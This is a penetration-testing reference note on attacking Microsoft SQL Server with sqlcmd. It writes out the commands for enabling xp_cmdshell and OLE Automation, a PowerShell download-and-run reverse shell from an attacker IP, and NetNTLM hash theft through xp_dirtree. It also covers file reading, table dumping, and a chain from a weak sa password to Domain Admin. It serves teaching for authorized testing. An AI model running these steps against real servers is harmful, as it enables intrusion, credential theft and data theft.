---
tags: [tools, enumeration, exploitation, vapt]
difficulty: intermediate
module: "59 - Complete Tools Reference"
topic: "59.70 sqlcmd Connecting to MSSQL"
---

# sqlcmd Connecting to MSSQL

## 1. Introduction to sqlcmd

`sqlcmd` is a command-line utility provided by Microsoft that allows users to enter Transact-SQL (T-SQL) statements, system procedures, and script files against SQL Server instances. For penetration testers operating from a Linux environment (such as Kali Linux), `sqlcmd` (part of the `mssql-tools` package) is an absolute necessity for interacting with Microsoft SQL (MSSQL) databases.

Unlike web-based SQL injection where you are blind or constrained by HTTP responses, `sqlcmd` provides a direct, authenticated, raw socket connection (usually on TCP port 1433) to the database engine. If a tester has acquired legitimate database credentials (or Windows domain credentials for an account with DB access), `sqlcmd` is the tool used to query data, manipulate database configurations, and frequently, execute underlying operating system commands via abused stored procedures.

## 2. Architecture and Attack Flow Diagram

```text
+---------------------------------------------------------+
|                  Attacker Workstation                   |
|                                                         |
|  +---------------------------------------------------+  |
|  | sqlcmd CLI Utility                                |  |
|  |                                                   |  |
|  |  [ Query Formatting ]   [ Authentication Module]  |  |
|  +---------------------------------------------------+  |
|                            |                            |
|                 TCP/1433 (TDS Protocol)                 |
|            (Tabular Data Stream / Encrypted)            |
|                            v                            |
+---------------------------------------------------------+
|                  Target Database Server                 |
|                                                         |
|  +---------------------------------------------------+  |
|  | SQL Server Engine (sqlservr.exe)                  |  |
|  |                                                   |  |
|  |  +---------------+  +--------------------------+  |  |
|  |  | Authentication|  | T-SQL Parser             |  |  |
|  |  | (SQL/Windows) |  |                          |  |  |
|  |  +---------------+  +--------------------------+  |  |
|  |                                                   |  |
|  |  +---------------+  +--------------------------+  |  |
|  |  | Data Tables   |  | Extended Stored Procs    |  |  |
|  |  | (Users, CCs)  |  | (xp_cmdshell, etc.)      |  |  |
|  |  +---------------+  +--------------------------+  |  |
|  |                           |                       |  |
|  +---------------------------|-----------------------+  |
+------------------------------|--------------------------+
                               |
                               v
+---------------------------------------------------------+
|                  Underlying Windows OS                  |
|  (cmd.exe / powershell.exe executed as service account) |
+---------------------------------------------------------+
```

## 3. Connecting to the Database

MSSQL supports two distinct authentication models: SQL Server Authentication (where the credentials reside entirely within the database engine) and Windows Authentication (where Active Directory/NTLM is used to verify identity).

### 3.1 SQL Server Authentication
This is the standard username/password combination. The default administrative user for MSSQL is `sa` (System Administrator).
- **Syntax**: `sqlcmd -S <IP_ADDRESS> -U <USERNAME> -P <PASSWORD>`
- **Example**: `sqlcmd -S 10.10.10.50 -U sa -P "SuperSecretSQL!"`

### 3.2 Certificate Trust Issues (`-C`)
Modern versions of `sqlcmd` attempt to use secure, encrypted connections by default. If the target server uses a self-signed certificate (which is extremely common in internal networks), the connection will fail immediately with a TLS trust error.
- **Solution**: You must append the `-C` flag to instruct `sqlcmd` to trust the server certificate implicitly.
- **Syntax**: `sqlcmd -S 10.10.10.50 -U sa -P "pass" -C`

### 3.3 The GO Command
A common pitfall for new users is typing a SQL query and hitting enter, only to see a blinking cursor waiting for more input. `sqlcmd` batches commands. It will not execute your typed SQL syntax until you explicitly tell it to process the batch by typing `GO` on a new line and pressing enter.

```sql
1> SELECT @@version;
2> GO
```

## 4. Advanced Enumeration and Exploitation

Once connected, a penetration tester's goal shifts from database access to underlying OS compromise.

### 4.1 Enabling xp_cmdshell
`xp_cmdshell` is an extended stored procedure that spawns a Windows command shell (`cmd.exe`) and passes in a string for execution. The output of the command is returned as rows of text to the SQL client. For security reasons, Microsoft disables this feature by default on modern MSSQL installations. However, if your user has `sysadmin` privileges (like the `sa` account), you can re-enable it.

**The Enable Sequence:**
```sql
1> EXEC sp_configure 'show advanced options', 1;
2> GO
1> RECONFIGURE;
2> GO
1> EXEC sp_configure 'xp_cmdshell', 1;
2> GO
1> RECONFIGURE;
2> GO
```

### 4.2 Executing OS Commands
Once enabled, you can run arbitrary Windows commands. The command will execute under the context of the Windows service account running the SQL Server engine (often `NT SERVICE\MSSQLSERVER` or sometimes, dangerously, `LocalSystem` or a Domain Admin service account).
- **Syntax**: `EXEC xp_cmdshell 'whoami';`
- **Reverse Shell Example**: You can use `xp_cmdshell` to download and execute a payload.
  `EXEC xp_cmdshell 'powershell -c "IEX (New-Object Net.WebClient).DownloadString(''http://10.10.14.5/rev.ps1'')"';`
  *(Note the double single-quotes required to escape strings inside the T-SQL query).*

### 4.3 Alternative Execution: OLE Automation Procedures
If `xp_cmdshell` is heavily monitored by an EDR (Endpoint Detection and Response) solution or cannot be enabled, an attacker might pivot to OLE Automation Procedures (`sp_OACreate`). This allows the database to create COM objects (like `WScript.Shell`) to execute commands or interact with the file system, often bypassing naive detections looking only for `xp_cmdshell`.

**Enable Sequence:**
```sql
1> EXEC sp_configure 'show advanced options', 1;
2> GO
1> RECONFIGURE;
2> GO
1> EXEC sp_configure 'Ole Automation Procedures', 1;
2> GO
1> RECONFIGURE;
2> GO
```

## 5. File System Interaction Without RCE

Sometimes, executing processes is impossible due to strict AppLocker or EDR rules. However, MSSQL can natively read and write files.

### 5.1 Reading Files (OPENROWSET)
If you need to read `C:\Windows\System32\drivers\etc\hosts` or configuration files containing passwords, you can use `OPENROWSET`.
```sql
1> SELECT * FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) AS x;
2> GO
```

### 5.2 Stealing NetNTLM Hashes via UNC Paths
A highly effective technique in Active Directory environments is forcing the SQL Server to authenticate to your attacking machine. By executing a procedure that attempts to access a file on an attacker-controlled SMB share, the SQL Server will automatically transmit its service account's NetNTLMv2 hash. You capture this hash using Responder.
```sql
1> EXEC master..xp_dirtree '\\10.10.14.5\fake_share';
2> GO
```
If the SQL service account is a highly privileged Domain User, you can crack this hash offline or relay it.

## 6. Scripting and Data Exfiltration

`sqlcmd` provides command-line flags to input queries from files and output results to files, which is essential for data exfiltration.

- **Input File (`-i`)**: Executes a script file containing T-SQL commands.
  `sqlcmd -S 10.10.10.50 -U sa -P pass -C -i commands.sql`
- **Output File (`-o`)**: Saves the query results to a local text file.
  `sqlcmd -S 10.10.10.50 -U sa -P pass -C -Q "SELECT * FROM Users" -o dumped_users.txt`
  *(Note: The `-Q` flag executes a query and then immediately exits `sqlcmd`, bypassing the need for an interactive prompt and `GO`).*

## 7. Troubleshooting Connection Issues

### 7.1 "Login failed for user"
This is a standard incorrect credential error. However, if you are attempting to use Windows Authentication, ensure you are specifying the domain properly and that your current Linux environment can resolve the Kerberos/NTLM negotiation properly.

### 7.2 "Network Interfaces: Connection refused"
The server is alive, but port 1433 is closed. The MSSQL instance might be running on a non-standard dynamic port. You will need to enumerate the correct port using `nmap` or the SQL Server Browser service (UDP 1434).
- **Connecting to non-standard ports**: `sqlcmd -S 10.10.10.50,14333 -U sa -P pass -C` (Note the comma `,` instead of a colon `:` for port specification).

## 8. Real-World Scenario: From SQL to Domain Admin

1.  **Discovery**: A port scan reveals TCP 1433 open. Brute-forcing with Hydra reveals the password `sa:sa123`.
2.  **Connection**: You connect from Kali: `sqlcmd -S 10.10.10.50 -U sa -P sa123 -C`
3.  **Command Execution**: You enable `xp_cmdshell`.
4.  **Enumeration**: Running `EXEC xp_cmdshell 'whoami';` reveals the service is running as `CORP\sql_service`.
5.  **Hash Capture**: Instead of popping a noisy shell, you start Responder on Kali and run `EXEC master..xp_dirtree '\\10.10.14.5\test';`.
6.  **Cracking**: Responder catches the NetNTLMv2 hash for `CORP\sql_service`. You crack it with Hashcat.
7.  **Lateral Movement**: You discover that `CORP\sql_service` is part of the Domain Admins group. You use CrackMapExec to Pass-the-Hash to the Domain Controller and dump the `NTDS.dit`.

## 9. Chaining Opportunities
- **[[28 - Impacket Tool Suite Overview]]**: Tools like `mssqlclient.py` provide a more interactive, user-friendly wrapper over the raw TDS protocol compared to `sqlcmd`, often automatically handling the `xp_cmdshell` enabling process and formatting output neatly.
- **[[54 - Hashcat Deep Dive]]**: When you force the SQL server to connect to your rogue SMB server using `xp_dirtree`, you will use Hashcat to crack the resulting NetNTLMv2 hash.
- **[[19 - Web Shells and C2 Frameworks]]**: Use `sqlcmd` to drop a compiled C2 beacon (like a Cobalt Strike or Sliver payload) onto disk via hex-encoding and `certutil`, then execute it.

## 10. Related Notes
- [[06 - Database Enumeration Techniques]]
- [[38 - Relational Database Management Systems Security]]
- [[14 - Lateral Movement via Stored Procedures]]

























